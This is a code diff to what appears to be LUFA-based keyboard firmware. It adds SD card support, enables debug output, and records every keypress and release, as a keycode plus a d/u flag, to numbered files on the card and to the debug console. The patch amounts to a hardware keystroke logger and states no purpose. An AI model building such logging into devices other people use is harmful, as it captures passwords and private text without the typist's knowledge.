@@ -36,6 +36,12 @@
   this software.
 */
 
+
+#include "SD.h"
+#include "WString.h"
+
+
+
 #include "report.h"
 #include "host.h"
 #include "host_driver.h"
@@ -59,7 +65,7 @@
 #include "lufa.h"
 
 
-//#define LUFA_DEBUG
+#define LUFA_DEBUG
 
 
 uint8_t keyboard_idle = 0;
@@ -549,6 +555,8 @@ int8_t sendchar(uint8_t c)
         return -1;
 
     uint8_t ep = Endpoint_GetCurrentEndpoint();
+    
+    uint8_t timeout = SEND_TIMEOUT;
     Endpoint_SelectEndpoint(CONSOLE_IN_EPNUM);
     if (!Endpoint_IsEnabled() || !Endpoint_IsConfigured()) {
         goto ERROR_EXIT;
@@ -560,7 +568,6 @@ int8_t sendchar(uint8_t c)
 
     timeouted = false;
 
-    uint8_t timeout = SEND_TIMEOUT;
     while (!Endpoint_IsReadWriteAllowed()) {
         if (USB_DeviceState != DEVICE_STATE_Configured) {
             goto ERROR_EXIT;
@@ -626,6 +633,129 @@ static void setup_usb(void)
     USB_Device_EnableSOFEvents();
 }
 
+
+const int chipSelect = 20; 
+const int ledPin = 6;
+
+bool _sdcardinited = false;
+void _printSdCardInfo(){
+
+    if(!_sdcardinited){
+        println("SDCARD unInit!!! ");
+        return ;
+    }
+    print("SDCARD type: ");
+    switch(SD.card.type()) {
+        case SD_CARD_TYPE_SD1:
+            println("SD1");
+            break;
+        case SD_CARD_TYPE_SD2:
+            println("SD2");
+            break;
+        case SD_CARD_TYPE_SDHC:
+            println("SDHC");
+            break;
+        default:
+            println("Unknown");
+    }
+    uint32_t volumesize;
+    print("Volume type is FAT");
+    int type = SD.volume.fatType();
+    dprintf("%d",type);
+    println(" ");
+    volumesize = SD.volume.blocksPerCluster();    // clusters are collections of blocks
+    volumesize *= SD.volume.clusterCount();       // we'll have a lot of clusters
+    volumesize /= 2;
+    print("Volume size (Mbytes): ");
+    volumesize /= 1024;
+    int a = volumesize;
+    dprintf("%d",a);
+    println(" ");
+    println(" ");
+}
+
+typedef unsigned int IndexType;
+File _file;
+bool _initFile(){
+    if(!_sdcardinited){
+        return false;
+    }
+    if(_file){
+        _file.close();
+    }
+    if(!SD.exists("index")){
+        IndexType i = 0;
+        File indexFile = SD.open("index", FILE_WRITE);
+        indexFile.write((uint8_t *)&i,(size_t)sizeof(IndexType));
+        indexFile.close();
+    }
+    IndexType index = 0;
+    File indexFile = SD.open("index", FILE_WRITE);
+    indexFile.seek(0);
+    indexFile.read((void*)&index,(size_t)sizeof(IndexType));
+    index++;
+    indexFile.seek(0);
+    indexFile.write((uint8_t *)&index,(size_t)sizeof(IndexType));
+    indexFile.close();
+    String fileName = String(index);
+    const char* cFileName = fileName.c_str();
+    _file = SD.open(cFileName, FILE_WRITE);
+    if(_file){
+        println("create file succeed");
+        return true;
+    }
+    _sdcardinited = false;
+    return false;
+}
+
+void _initSdCardAnFile(){
+    if (!SD.card.init(SPI_HALF_SPEED, chipSelect)) {
+        println("initialization failed. Things to check:");
+        println("* is a card inserted?");
+        println("* is your wiring correct?");
+        println("* did you change the chipSelect pin to match your shield or module?");
+        _delay_ms(100);
+    } else {
+        println("Wiring is correct and a card is present."); 
+        if (!SD.volume.init(SD.card)) {
+            println("Could not find FAT16/FAT32 partition.\nMake sure you've formatted the card");
+        }else{
+            if(!SD.root.openRoot(SD.volume)){
+                println("Could not openRoot");
+            }else{
+                _sdcardinited = true;
+                _printSdCardInfo();
+                _initFile();
+            }
+        }
+    }
+}
+
+void _writeToSDCard(uint8_t keycode,uint8_t pressed){
+    if(_file){
+        if(100000 - _file.size()<16){
+            _initFile();
+        }
+        uint8_t data[2] = {keycode,pressed};//for speed
+        _file.write(data,2);
+        _file.flush();
+    }
+}
+
+extern const uint8_t keymaps[][MATRIX_ROWS][MATRIX_COLS];
+void _keyboardCallBackFun(uint8_t row,uint8_t col,bool isPressed){
+    // dprintf("%04X%c", (row<<8 | col), (isPressed ? 'd' : 'u'));
+    // println(" ");
+    if(_sdcardinited){
+        // _printSdCardInfo();
+        uint8_t keycode = pgm_read_byte(&keymaps[(0)][(row)][(col)]);
+        char pressed = isPressed ? 'd' : 'u';
+        dprintf("%u,%c\n",keycode,pressed);
+        _writeToSDCard(keycode,pressed);
+    }
+}
+
+
 int main(void)  __attribute__ ((weak));
 int main(void)
 {
@@ -662,6 +792,12 @@ int main(void)
 
     print("Keyboard start.\n");
     hook_late_init();
+
+    _delay_ms(500);
+    _initSdCardAnFile();
+    _delay_ms(500);
+
+    pinMode(ledPin, OUTPUT);     
     while (1) {
         while (USB_DeviceState == DEVICE_STATE_Suspended) {
 #ifdef LUFA_DEBUG
@@ -670,7 +806,13 @@ int main(void)
             hook_usb_suspend_loop();
         }
 
-        keyboard_task();
+        keyboard_task(_keyboardCallBackFun);
+
+        if(!_sdcardinited){
+            digitalWrite(ledPin, HIGH);   // turn the LED on (HIGH is the voltage level)
+        }else{
+            digitalWrite(ledPin, LOW);    // turn the LED off by making the voltage LOW
+        }
 
 #if !defined(INTERRUPT_CONTROL_ENDPOINT)
         USB_USBTask();
